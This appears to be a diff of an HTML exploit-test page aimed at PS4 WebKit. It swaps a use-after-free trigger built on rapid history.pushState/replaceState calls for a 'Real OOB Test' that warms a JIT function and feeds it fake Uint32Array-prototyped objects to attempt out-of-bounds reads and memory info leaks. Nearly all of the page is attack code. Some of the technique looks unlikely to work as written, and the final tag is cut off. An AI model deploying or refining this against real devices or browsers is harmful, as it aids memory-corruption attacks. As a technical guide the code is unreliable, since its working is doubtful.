@@ -1,88 +1,171 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="UTF-8">
-<title>PS4 WebKit – UAF Hot Entropy Test (Reconstructed)</title>
-<style>
-body { background:#000; color:#0f0; font-family: monospace; }
-button { font-size:16px; margin:6px; }
-pre { white-space: pre-wrap; }
-</style>
-</head>
+<head><title>Real OOB Test</title></head>
 <body>
-
-<button onclick="run()">RUN (sem reload)</button>
-<button onclick="clearLog()">CLEAR LOG</button>
-
+<button onclick="test()">Test Real OOB</button>
 <pre id="log"></pre>
 
 <script>
-const logEl = document.getElementById('log');
-function log(s){ logEl.textContent += s + "\n"; }
-function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+const logEl = document.getElementById("log");
+function log(m) { logEl.textContent += m + "\n"; }
 
-function probe(tag){
-    let s = location.href;
-    log(`[${tag}] URL.length = ${s.length}`);
-    [16,32,48,64,96,128,256].forEach(o=>{
+const BASE = 977, STEP = 14461, UAF_ITERS = 48;
+
+async function triggerUAF() {
+  let size = BASE;
+  for(let i=0; i<UAF_ITERS; i++){
+    history.pushState({index:i}, "", "#" + "E".repeat(size));
+    history.replaceState({index:i}, "", "#" + "E".repeat(size >> 1));
+    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
+    size += STEP;
+    await new Promise(r=>setTimeout(r,5));
+  }
+  await new Promise(r=>setTimeout(r,200));
+}
+
+async function test() {
+  log("=== REAL OOB TEST ===\n");
+  
+  await triggerUAF();
+  
+  window.addEventListener('popstate', (e) => {
+    if(e.state && e.state.index >= 40) {
+      log("[RACE] Testing REAL OOB...\n");
+      
+      // CRITICAL: Criar REAL TypedArray primeiro
+      log("[1] Creating REAL Uint32Array with known pattern:");
+      const realArray = new Uint32Array(100);
+      for(let i=0; i<100; i++) {
+        realArray[i] = 0xAAAA0000 + i;
+      }
+      log("    Real array[0] = 0x" + realArray[0].toString(16));
+      log("    Real array[99] = 0x" + realArray[99].toString(16));
+      
+      // Criar marker object LOGO APÓS o array (esperando adjacência)
+      log("\n[2] Creating marker object (hoping for adjacency):");
+      const marker = {
+        signature: 0xDEADBEEF,
+        id: 12345,
+        flag: true
+      };
+      log("    marker.signature = 0x" + marker.signature.toString(16));
+      
+      // JIT function
+      function jit_access(arr, idx) {
+        return arr[idx];
+      }
+      
+      // Warm up com REAL array
+      log("\n[3] Warming JIT with REAL TypedArray:");
+      for(let i=0; i<10000; i++) {
+        jit_access(realArray, i % 100);
+      }
+      log("    JIT compiled");
+      
+      // AGORA: Criar fake que IMITA real TypedArray
+      log("\n[4] Creating fake TypedArray:");
+      
+      const fake = {
+        length: 0x10000,
+        byteLength: 0x40000,
+        byteOffset: 0,
+        BYTES_PER_ELEMENT: 4
+      };
+      
+      // Copiar estrutura de Uint32Array
+      Object.setPrototypeOf(fake, Uint32Array.prototype);
+      
+      log("    Fake created with Uint32Array prototype");
+      log("    Fake length: " + fake.length);
+      
+      // CRITICAL TEST: Ler VALORES NÃO INICIALIZADOS
+      log("\n[5] Reading UNINITIALIZED indices:\n");
+      
+      let foundData = false;
+      
+      for(let i=0; i<200; i++) {
         try {
-            log(`[${tag}] cc(${o}) = ${s.charCodeAt(o)}`);
-        } catch(e){
-            log(`[${tag}] cc(${o}) = EXC`);
+          const val = jit_access(fake, i);
+          
+          // Se ler algo diferente de undefined/0, pode ser leak!
+          if(val !== undefined && val !== 0 && !isNaN(val)) {
+            log(`    [${i}] = 0x${val.toString(16).padStart(8,'0')}`);
+            foundData = true;
+            
+            // Check se é nosso marker
+            if(val === 0xDEADBEEF) {
+              log(`\n    🚨🚨🚨 FOUND MARKER! 🚨🚨🚨`);
+              log(`    🚨 INFO LEAK CONFIRMED! 🚨`);
+            }
+            
+            // Check se é do realArray
+            if((val & 0xFFFF0000) === 0xAAAA0000) {
+              log(`\n    🚨 LEAKED REAL ARRAY DATA! 🚨`);
+            }
+          }
+        } catch(err) {
+          log(`    [${i}] Exception: ${err.message}`);
+          break;
         }
-    });
-}
-
-/* ===============================
-   CONFIRMED UAF TRIGGER (AS-IS)
-   =============================== */
-async function triggerUAF(){
-    log("=== UAF TRIGGER START ===");
-    let size = 977;
-    const STEP = 14461;
-
-    for(let i=0;i<48;i++){
-        let frag = "A".repeat(size);
-        history.pushState({}, "", "#"+frag);
-        history.replaceState({}, "", "#"+frag.slice(0, frag.length >> 1));
-
-        if(i === 18 || i === 24 || i === 30){
-            probe(`MID-${i}`);
+      }
+      
+      if(!foundData) {
+        log("    No data leaked (all undefined/0)");
+      }
+      
+      // ALTERNATIVE: Tentar com backing store pointer
+      log("\n[6] Attempting buffer backing store confusion:\n");
+      
+      const buffer = new ArrayBuffer(256);
+      const view = new Uint32Array(buffer);
+      
+      for(let i=0; i<64; i++) {
+        view[i] = 0xBEEF0000 + i;
+      }
+      
+      log("    Real buffer created with pattern");
+      
+      // Criar fake view sem buffer
+      const fakeView = {
+        length: 1000,
+        buffer: buffer,  // Pointing to REAL buffer
+        byteLength: 4000,
+        byteOffset: 0,
+        BYTES_PER_ELEMENT: 4
+      };
+      Object.setPrototypeOf(fakeView, Uint32Array.prototype);
+      
+      // Warm up
+      for(let i=0; i<10000; i++) {
+        jit_access(view, i % 64);
+      }
+      
+      log("\n    Reading via fake view (pointing to real buffer):");
+      
+      for(let i=0; i<100; i++) {
+        try {
+          const val = jit_access(fakeView, i);
+          
+          if(val !== undefined && val !== 0) {
+            log(`      [${i}] = 0x${val.toString(16)}`);
+            
+            if(i >= 64) {
+              log(`        🚨 READ BEYOND REAL BUFFER! (size=64)`);
+            }
+          }
+        } catch(e) {
+          log(`      [${i}] ${e.message}`);
+          break;
         }
-
-        if(i % 6 === 0){
-            setTimeout(()=>history.back(),0);
-            log(`[ITER ${i}] back() async`);
-        }
-
-        size += STEP;
-        await sleep(5);
+      }
     }
-    log(">>> UAF WINDOW <<<");
-}
-
-async function run(){
-    log("\n================ RUN ================");
-    log(`[STATE] history.length = ${history.length}`);
-    log(`[STATE] URL.length = ${location.href.length}`);
-
-    await triggerUAF();
-
-    // Leituras “quentes”, sem estabilizar heap
-    probe("POST-IMM");
-
-    Promise.resolve().then(()=>probe("POST-MICRO"));
-    requestAnimationFrame(()=>probe("POST-RAF"));
-    setTimeout(()=>probe("POST-T0"), 0);
-    setTimeout(()=>probe("POST-T-RAND"), Math.random()*10);
-
-    log("=============== END RUN ===============\n");
-}
-
-function clearLog(){
-    logEl.textContent = "";
+  });
+  
+  for(let i=0; i<15; i++) {
+    history.back();
+    await new Promise(r=>setTimeout(r,40));
+  }
 }
 </script>
-
 </body>
-</html>
+</html
